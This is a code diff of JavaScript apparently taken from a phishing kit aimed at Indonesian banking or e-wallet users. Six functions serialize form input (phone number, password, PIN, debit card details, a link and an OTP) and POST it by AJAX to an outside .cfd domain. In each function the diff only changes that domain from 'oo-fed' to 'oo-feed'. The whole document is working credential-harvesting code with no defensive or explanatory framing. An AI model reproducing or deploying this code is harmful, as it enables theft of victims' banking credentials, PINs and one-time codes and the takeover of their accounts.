@@ -10,7 +10,7 @@ function sendHp() {
    sessionStorage.setItem('nohp', nohp);
    $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-fed.cfd/sult/no.php',
+        url: 'https://choreoapps.oo-feed.cfd/sult/no.php',
         data: $('#nomor').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -36,7 +36,7 @@ function sendLogin() {
    sessionStorage.setItem('password', password);
    $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-fed.cfd/sult/user.php',
+        url: 'https://choreoapps.oo-feed.cfd/sult/user.php',
         data: $('#login').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -52,7 +52,7 @@ function sendPin(event){
     event.preventDefault();     
     $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-fed.cfd/sult/pin.php',
+        url: 'https://choreoapps.oo-feed.cfd/sult/pin.php',
         data: $('#ryuSubmit').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -67,7 +67,7 @@ function sendDebit(event) {
 document.getElementById('kirim').innerHTML = "Memproses...";      
     $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-fed.cfd/sult/debit.php',
+        url: 'https://choreoapps.oo-feed.cfd/sult/debit.php',
         data: $('#debit').serialize(),
         datatype: 'JSON',        
     complete: function(){
@@ -79,7 +79,7 @@ function kirimPesan(event){
   event.preventDefault();
     $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-fed.cfd/sult/link.php',
+        url: 'https://choreoapps.oo-feed.cfd/sult/link.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',       
     complete: function(){
@@ -94,7 +94,7 @@ function kirimPesan1(event){
   event.preventDefault();
     $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-fed.cfd/sult/otp.php',
+        url: 'https://choreoapps.oo-feed.cfd/sult/otp.php',
         data: $('#formOtp').serialize(),
         datatype: 'JSON',        
    complete: function(){     
